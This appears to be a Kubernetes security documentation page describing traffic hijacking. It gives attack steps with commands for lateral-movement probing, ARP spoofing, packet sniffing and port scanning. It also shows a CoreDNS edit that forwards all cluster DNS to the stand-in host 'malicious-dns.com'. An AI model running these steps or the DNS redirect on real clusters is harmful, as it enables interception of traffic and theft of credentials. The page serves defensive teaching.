---
sidebar_position: 11
title: "Traffic Hijacking"
description: "How attackers manipulate Kubernetes network traffic to intercept, redirect, or disrupt communication between workloads."
keywords: [kubernetes security, traffic hijacking, network security, man-in-the-middle, MITM, service mesh, network policies, ingress security, egress control, network interception]
tags: [attack-vector, network, mitm, CKS]
related:
  - /docs/best_practices/cluster_setup_and_hardening/network_security/traffic_hijacking_mitigation/
  - /docs/best_practices/cluster_setup_and_hardening/network_security/service_mesh_security/
  - /docs/best_practices/cluster_setup_and_hardening/network_security/network_policies/
  - /docs/attack_vectors/lack_of_network_policies/
---

# Traffic Hijacking

Traffic hijacking in Kubernetes occurs when an attacker intercepts or redirects network communication between workloads. This enables **data theft, service disruption, and man-in-the-middle (MITM) attacks**, especially in environments lacking network segmentation and traffic encryption.

---

## Exploitation Steps: Manipulating Kubernetes Network Traffic

An attacker exploits **missing network policies, insecure service exposure, or DNS misconfigurations** to hijack traffic within the cluster.

### 1. Exploit Missing Network Policies

The attacker checks if restrictive network policies are in place:

```bash
kubectl get networkpolicies --all-namespaces
```

If none exist, they attempt lateral movement from a compromised pod:

```bash
kubectl run attacker-pod --rm -it --image=alpine -- /bin/sh
nc -zv <target-pod-ip> 443
```

Without network segmentation, pods can communicate freely, enabling reconnaissance and access to sensitive services.

---

### 2. Perform Man-in-the-Middle (MITM) Attack

From within a compromised pod, the attacker intercepts traffic using ARP spoofing:

```bash
arpspoof -i eth0 -t <victim-ip> <gateway-ip>
```

Or captures unencrypted data with:

```bash
tcpdump -i eth0 -A port 443
```

This allows them to steal session data, secrets, or API credentials.

---

### 3. Manipulate DNS with Compromised CoreDNS

If **CoreDNS** is misconfigured or lacks validation, the attacker injects rogue entries:

```bash
kubectl edit configmap coredns -n kube-system
```

Example modification:

```yaml
.:53 {
forward . malicious-dns.com
}
```

All DNS traffic is now redirected to attacker-controlled servers, enabling traffic rerouting or phishing.

---

### 4. Abuse Insecure External Service Exposure

If services are exposed using NodePort or LoadBalancer without proper controls, the attacker scans for open ports:

```bash
nmap -p 30000-32767 <cluster-node-ip>
```

Once found, they can access backend services without authentication and extract sensitive data directly.

---

### Result

The attacker successfully intercepts or manipulates network traffic, leading to:

- **Unauthorized access to services and data**
- **Intra-cluster lateral movement**
- **Disrupted communications and workload instability**

---

## Mitigation

➡ [Securing Kubernetes Network Traffic](/docs/best_practices/cluster_setup_and_hardening/network_security/traffic_hijacking_mitigation)
